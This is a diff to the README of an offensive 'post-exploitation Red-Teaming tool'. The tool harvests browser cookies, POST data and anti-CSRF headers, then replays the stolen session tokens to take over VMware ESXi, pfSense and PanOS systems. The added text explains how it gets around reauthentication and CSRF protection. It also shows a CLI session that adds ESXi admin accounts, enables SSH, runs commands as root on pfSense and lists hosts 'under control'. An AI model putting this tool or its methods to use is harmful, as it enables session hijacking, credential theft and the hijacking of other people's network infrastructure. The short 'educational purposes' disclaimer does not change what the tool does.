@@ -2,7 +2,9 @@
 ![logo](https://github.com/M507/6-Eyed-Spider/raw/master/Examples/spider-1.png)
 
 ### Abstract
-This is a post-exploitation Red-Teaming tool. It gathers data going out and coming into the browser — data like POST requests, cookies, and chosen headers like (ANTI-CSRF headers), then sends all data to Strapi. Strapi and MongoDB store the data so that 6-Eyed-Spider-CLI can use the collected data to perform specific attacks. Attacks using the users' valid cookies to execute commands, create admin users, enable unwanted functionalities, manipulate data in systems like VMware, Pfsense, and PanOS. 
+This is a post-exploitation Red-Teaming tool. It gathers data going out and coming into the browser — data like POST requests, cookies, and chosen headers like (ANTI-CSRF headers), then sends all data to Strapi. Strapi and MongoDB store the data so that 6-Eyed-Spider-CLI can use the collected data to perform specific attacks. Attacks using the users' valid cookies to execute commands, create admin users, enable unsafe functionalities, manipulate data in systems like VMware, Pfsense, and PanOS. 
+
+The tool takes advantage of how web applications usually are designed. No matter how many authentication steps a web application uses, there will be a weak point where if you know specific tokens, you will be able to interact with the application without the need for reauthenticating. The tool uses these specific tokens to perform critical tasks as authenticated users. It also deals with Anti-CSRF protection; thus, almost every request can be passed.
 
 The tool consists of a couple of parts:
 * Dockerized MongoDB and Strapi
@@ -20,6 +22,7 @@ This Red-Team tool is used for educational purposes ONLY!
  * [Abstract](#abstract)
  * [Disclaimer](#disclaimer)
  * [How to](#how-to)
+    * [Use 6-Eyed-Spider-CLI](#Use 6-Eyed-Spider-CLI)
     * [Install 6-Eyed-Spider](#install-6-eyed-spider)
     * [Run the server manually](#run-the-server-manually)
  * [Configure the admin panel and the API address from](#configure-the-admin-panel-and-the-api-address-from)
@@ -30,6 +33,44 @@ This Red-Team tool is used for educational purposes ONLY!
  * [Todos](#todos)
 
 ### How to:
+
+#### Use 6-Eyed-Spider-CLI:
+```sh
+Welcome! Type ? to list commands
+6-Eyed-Spider> ?
+
+Documented commands (type help <topic>):
+========================================
+Add_ESXI_Admin           Print_all_ESXis_under_control     exit
+ESXI_Enable_SSH          Print_all_pfSenses_under_control  help
+Execute_pfSense_Command  Print_creds                     
+
+6-Eyed-Spider> help Add_ESXI_Admin
+Add admin user.
+Usage: Add_ESXI_Admin <ESXI_IP> <USERNAME> <STRONG_PASSWORD> <Description>
+Add_ESXI_Admin 192.168.1.10 BLACK_TEAM Liverpool!1!1! Description1
+Add_ESXI_Admin 192.168.1.10 ADMIN Liverpool!1998 Description2
+
+6-Eyed-Spider> help Execute_pfSense_Command
+Enable SSH.
+Usage: Execute_pfSense_Command <ESXI_IP> <Command>
+Execute_pfSense_Command 192.168.1.10 id
+Execute_pfSense_Command 192.168.1.10 whoami
+
+6-Eyed-Spider> Execute_pfSense_Command 192.168.1.254 whoami
+
+root 
+
+6-Eyed-Spider> Print_all_pfSenses_under_control
+
+https://192.168.1.254/
+https://192.168.2.254/
+https://192.168.3.254/
+https://192.168.4.254/
+
+6-Eyed-Spider>
+```
+
 #### Install 6-Eyed-Spider:
 ```sh
 [M507:~]$ bash Install.sh
